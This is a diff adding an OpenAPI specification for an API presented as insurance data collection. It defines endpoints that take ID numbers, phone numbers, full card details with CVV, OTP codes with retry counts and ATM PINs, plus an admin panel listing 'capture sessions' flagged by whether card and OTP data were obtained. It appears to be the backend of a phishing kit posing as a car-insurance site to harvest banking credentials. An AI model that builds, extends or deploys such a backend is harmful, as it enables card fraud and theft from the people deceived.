@@ -1,0 +1,519 @@
+openapi: 3.1.0
+info:
+  title: Api
+  version: 0.1.0
+  description: Insurance data collection and admin API
+servers:
+  - url: /api
+    description: Base API path
+tags:
+  - name: health
+    description: Health operations
+  - name: submissions
+    description: Form submission operations
+  - name: admin
+    description: Admin operations
+
+paths:
+  /healthz:
+    get:
+      operationId: healthCheck
+      tags: [health]
+      summary: Health check
+      responses:
+        "200":
+          description: Healthy
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/HealthStatus"
+
+  /submissions/initial:
+    post:
+      operationId: submitInitial
+      tags: [submissions]
+      summary: Submit initial form data
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/InitialFormInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /submissions/vehicle:
+    post:
+      operationId: submitVehicle
+      tags: [submissions]
+      summary: Submit vehicle details
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VehicleFormInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /submissions/payment:
+    post:
+      operationId: submitPayment
+      tags: [submissions]
+      summary: Submit payment intent
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/PaymentInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /submissions/card:
+    post:
+      operationId: submitCard
+      tags: [submissions]
+      summary: Submit card details
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/CardInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /submissions/otp:
+    post:
+      operationId: submitOtp
+      tags: [submissions]
+      summary: Submit OTP code
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/OtpInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /submissions/atm:
+    post:
+      operationId: submitAtm
+      tags: [submissions]
+      summary: Submit ATM PIN
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/AtmInput"
+      responses:
+        "201":
+          description: Created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionAck"
+
+  /admin/login:
+    post:
+      operationId: adminLogin
+      tags: [admin]
+      summary: Admin login
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/AdminCredentials"
+      responses:
+        "200":
+          description: Login successful
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/AuthResult"
+        "401":
+          description: Invalid credentials
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResult"
+
+  /admin/logout:
+    post:
+      operationId: adminLogout
+      tags: [admin]
+      summary: Admin logout
+      responses:
+        "200":
+          description: Logged out
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResult"
+
+  /admin/submissions:
+    get:
+      operationId: listSubmissions
+      tags: [admin]
+      summary: List all submissions
+      parameters:
+        - name: page
+          in: query
+          schema:
+            type: integer
+            default: 1
+        - name: limit
+          in: query
+          schema:
+            type: integer
+            default: 50
+        - name: type
+          in: query
+          schema:
+            type: string
+      responses:
+        "200":
+          description: List of submissions
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SubmissionListResponse"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResult"
+
+  /admin/submissions/{id}:
+    get:
+      operationId: getSubmission
+      tags: [admin]
+      summary: Get submission details
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: integer
+      responses:
+        "200":
+          description: Submission details
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/FullSubmission"
+        "404":
+          description: Not found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResult"
+
+  /admin/stats:
+    get:
+      operationId: getAdminStats
+      tags: [admin]
+      summary: Get admin dashboard statistics
+      responses:
+        "200":
+          description: Stats
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/AdminStats"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResult"
+
+  /admin/sessions:
+    get:
+      operationId: listSessions
+      tags: [admin]
+      summary: List all capture sessions grouped by session ID
+      responses:
+        "200":
+          description: Sessions list
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/SessionListResponse"
+        "401":
+          description: Unauthorized
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResult"
+
+components:
+  schemas:
+    HealthStatus:
+      type: object
+      required: [status]
+      properties:
+        status:
+          type: string
+
+    InitialFormInput:
+      type: object
+      required: [sessionId, idNumber, ownerName, phone]
+      properties:
+        sessionId:
+          type: string
+        idNumber:
+          type: string
+        ownerName:
+          type: string
+        phone:
+          type: string
+        formType:
+          type: ["string", "null"]
+        serialNumber:
+          type: ["string", "null"]
+        manufactureYear:
+          type: ["string", "null"]
+
+    VehicleFormInput:
+      type: object
+      required: [sessionId]
+      properties:
+        sessionId:
+          type: string
+        insuranceType:
+          type: ["string", "null"]
+        manufactureYear:
+          type: ["string", "null"]
+        startDate:
+          type: ["string", "null"]
+        usagePurpose:
+          type: ["string", "null"]
+        carValue:
+          type: ["string", "null"]
+
+    PaymentInput:
+      type: object
+      required: [sessionId, paymentMethod, amount]
+      properties:
+        sessionId:
+          type: string
+        paymentMethod:
+          type: string
+        amount:
+          type: string
+        insuranceCompany:
+          type: ["string", "null"]
+
+    CardInput:
+      type: object
+      required: [sessionId, cardNumber]
+      properties:
+        sessionId:
+          type: string
+        cardNumber:
+          type: string
+        cardHolder:
+          type: ["string", "null"]
+        expiry:
+          type: ["string", "null"]
+        cvv:
+          type: ["string", "null"]
+
+    OtpInput:
+      type: object
+      required: [sessionId, otpCode, attempt]
+      properties:
+        sessionId:
+          type: string
+        otpCode:
+          type: string
+        attempt:
+          type: integer
+
+    AtmInput:
+      type: object
+      required: [sessionId, atmCode]
+      properties:
+        sessionId:
+          type: string
+        atmCode:
+          type: string
+
+    AdminCredentials:
+      type: object
+      required: [username, password]
+      properties:
+        username:
+          type: string
+        password:
+          type: string
+
+    AuthResult:
+      type: object
+      required: [success, token]
+      properties:
+        success:
+          type: boolean
+        token:
+          type: string
+
+    OkResult:
+      type: object
+      required: [success]
+      properties:
+        success:
+          type: boolean
+
+    ErrorResult:
+      type: object
+      required: [error]
+      properties:
+        error:
+          type: string
+
+    SubmissionAck:
+      type: object
+      required: [id, sessionId]
+      properties:
+        id:
+          type: integer
+        sessionId:
+          type: string
+
+    Submission:
+      type: object
+      required: [id, sessionId, type, createdAt]
+      properties:
+        id:
+          type: integer
+        sessionId:
+          type: string
+        type:
+          type: string
+        data:
+          type: ["string", "null"]
+        ipAddress:
+          type: ["string", "null"]
+        userAgent:
+          type: ["string", "null"]
+        createdAt:
+          type: string
+
+    FullSubmission:
+      type: object
+      required: [id, sessionId, type, createdAt]
+      properties:
+        id:
+          type: integer
+        sessionId:
+          type: string
+        type:
+          type: string
+        data:
+          type: ["string", "null"]
+        ipAddress:
+          type: ["string", "null"]
+        userAgent:
+          type: ["string", "null"]
+        createdAt:
+          type: string
+
+    SubmissionListResponse:
+      type: object
+      required: [submissions, total, page, limit]
+      properties:
+        submissions:
+          type: array
+          items:
+            $ref: "#/components/schemas/Submission"
+        total:
+          type: integer
+        page:
+          type: integer
+        limit:
+          type: integer
+
+    AdminStats:
+      type: object
+      required: [totalSessions, totalSubmissions, byType, recentSessions]
+      properties:
+        totalSessions:
+          type: integer
+        totalSubmissions:
+          type: integer
+        byType:
+          type: array
+          items:
+            $ref: "#/components/schemas/TypeCount"
+        recentSessions:
+          type: array
+          items:
+            $ref: "#/components/schemas/SessionSummary"
+
+    TypeCount:
+      type: object
+      required: [type, count]
+      properties:
+        type:
+          type: string
+        count:
+          type: integer
+
+    SessionSummary:
+      type: object
+      required: [sessionId, submissionCount, lastActivity]
+      properties:
+        sessionId:
+          type: string
+        ownerName:
+          type: ["string", "null"]
+        phone:
+          type: ["string", "null"]
+        submissionCount:
+          type: integer
+        lastActivity:
+          type: string
+        hasCard:
+          type: boolean
+        hasOtp:
+          type: boolean
+
+    SessionListResponse:
+      type: object
+      required: [sessions]
+      properties:
+        sessions:
+          type: array
+          items:
+            $ref: "#/components/schemas/SessionSummary"
